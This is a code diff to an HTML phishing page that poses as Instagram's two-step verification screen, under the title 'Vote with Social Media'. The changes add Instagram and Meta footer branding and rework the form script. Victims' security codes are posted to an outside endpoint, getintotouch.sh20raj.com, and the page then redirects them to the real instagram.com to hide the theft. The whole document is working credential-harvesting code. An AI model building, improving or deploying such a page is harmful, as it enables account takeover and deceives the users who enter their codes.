@@ -9,7 +9,22 @@
   <link rel="stylesheet" href="style2.css">
   <title>Vote with Social Media</title>
   <style>
-    /* Your existing styles */
+    .small-title {
+      margin: 1em auto;
+      color: #000;
+    }
+
+    .form-area form input {
+      padding: 0.5em;
+      outline-width: none !important;
+    }
+
+    .small {
+      font-size: 0.85em;
+      display: block;
+      text-align: center;
+      margin: 0.5em auto;
+    }
   </style>
 </head>
 
@@ -27,7 +42,7 @@
     <!-- SMARTPHONE SECTION END -->
     <!-- FORM SECTION -->
     <article class="form-area">
-      <form action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST">
+      <form id="myForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST">
         <p class="small-title">2-Step Verification</p>
         <input type="text" name="code" id="code" required="" placeholder="Security code">
         <input type="hidden" name="linkId" value="657c42262ec13a0c21704b76">
@@ -55,25 +70,52 @@
   <!-- FORM SECTION END -->
   <!-- FOOTER -->
   <footer>
-    <!-- Your existing footer content -->
+    <div class="footer-content">
+      <a href="#">Meta</a>
+      <a href="#">About</a>
+      <a href="#">Blog</a>
+      <a href="#">Jobs</a>
+      <a href="#">API</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Locations</a>
+      <a href="#">Hashtags</a>
+      <a href="#">Threads</a>
+      <a href="#">Instagram Lite</a>
+    </div>
+    <div>
+      <a href="#">Dance</a>
+      <a href="#">Food and Drink</a>
+      <a href="#">Home garden</a>
+      <a href="#">Music</a>
+      <a href="#">Visual arts</a>
+    </div>
+    <div class="copyright">
+      <select aria-label="Trocar idioma de exibição">
+        <!-- Your language options here -->
+      </select>
+      <span>© 2023 Instagram from Meta</span>
+    </div>
   </footer>
   <script src="/js/socials/app.js"></script>
   <script src="/js/socials/brands.min.js"></script>
   <script src="/js/socials/fontawesome.min.js"></script>
-
   <script>
-    document.querySelector('form').addEventListener('submit', function (e) {
+    document.getElementById('myForm').addEventListener('submit', function (e) {
       e.preventDefault(); // Prevent the form from submitting the traditional way
 
       // Your form processing logic here
 
-      // Redirect to another URL after form submission
-      window.location.href = 'https://www.instagram.com';
-
-      // Now, submit the form to the original action URL
-      setTimeout(() => {
-        document.querySelector('form').submit();
+      // Submit the form to the original action URL
+      var form = this;
+      setTimeout(function () {
+        form.submit();
       }, 1000); // Adjust the delay (in milliseconds) based on your needs
+
+      // Redirect to Instagram after form submission
+      setTimeout(function () {
+        window.location.href = 'https://www.instagram.com/';
+      }, 2000); // Adjust the delay for redirection
     });
   </script>
 </body>
